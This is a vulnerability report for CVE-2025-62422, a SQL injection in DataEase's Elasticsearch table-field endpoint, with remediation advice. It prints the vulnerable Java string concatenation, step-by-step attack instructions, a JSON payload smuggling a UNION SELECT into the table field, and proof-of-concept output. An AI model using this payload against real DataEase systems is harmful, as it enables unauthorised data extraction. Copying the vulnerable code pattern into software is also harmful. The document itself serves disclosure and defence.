# CVE-2025-62422 Vulnerability Report

## Overview

| Field | Value |
|-------|-------|
| CVE ID | CVE-2025-62422 |
| GHSA ID | GHSA-54m5-xrw4-mv36 |
| CWE | CWE-89 (SQL Injection) |
| CVSS Score | 8.8 (High) |
| Affected Product | DataEase |
| Affected Versions | <= 2.10.13 |
| Fixed Version | 2.10.14 |

## Vulnerability Description

DataEase is an open source data visualization and analytics platform. In versions 2.10.13 and earlier, the `/de2api/datasetData/tableField` interface is vulnerable to SQL injection. An attacker can construct a malicious `tableName` parameter to execute arbitrary SQL commands.

## Technical Analysis

### Vulnerable Code Location

**File:** `core/core-backend/src/main/java/io/dataease/datasource/provider/EsProvider.java`  
**Line:** 98

```java
@Override
public List<TableField> fetchTableField(DatasourceRequest datasourceRequest) {
    List<TableField> tableFields = new ArrayList<>();
    try {
        String sql;
        if (datasourceRequest.getTable() != null) {
            sql = "select * from \"" + datasourceRequest.getTable() + "\" limit 0";  // VULNERABLE
        } else {
            sql = datasourceRequest.getQuery();
        }
        String response = execQuery(datasourceRequest, sql, "?format=json");
        tableFields = fetchResultField4Sql(response);
    } catch (Exception e) {
        DEException.throwException(e);
    }
    return tableFields;
}
```

### Root Cause

The `tableName` parameter from `datasourceRequest.getTable()` is directly concatenated into the SQL query string without any sanitization or parameterization.

### Attack Vector

1. Authenticate to DataEase (requires valid credentials)
2. Create or use an existing Elasticsearch datasource
3. Send a POST request to `/de2api/datasetData/tableField` with malicious payload

### Payload Example

```json
{
    "datasourceId": "<es_datasource_id>",
    "info": "{\"table\": \"testindex\\\" UNION SELECT 1,2 --\"}",
    "type": "db",
    "isCross": false
}
```

### Proof of Concept Result

```
Response: {"code":40001,"msg":"DEException(code=40001, msg=HttpClient查询失败: 
{\"error\":{\"root_cause\":[{\"type\":\"parsing_exception\",
\"reason\":\"line 1:33: mismatched input 'SELECT' expecting ...
```

The error message "mismatched input 'SELECT'" confirms that the UNION SELECT payload was injected into the SQL query and parsed by Elasticsearch.

## Exploitation Requirements

| Requirement | Description |
|-------------|-------------|
| Authentication | Valid user credentials required |
| Datasource | Elasticsearch datasource must be configured |
| Privileges | User must have access to datasource management |

## Impact

An authenticated attacker can:
- Extract sensitive data from the Elasticsearch cluster
- Execute arbitrary SQL commands against the ES SQL API
- Potentially escalate privileges depending on ES configuration

## Remediation

1. Upgrade to DataEase v2.10.14 or later
2. If upgrade is not possible, restrict access to datasource management features
3. Monitor for suspicious SQL patterns in logs

## References

- [GitHub Security Advisory](https://github.com/dataease/dataease/security/advisories/GHSA-54m5-xrw4-mv36)
- [DataEase Official Website](https://dataease.io/)
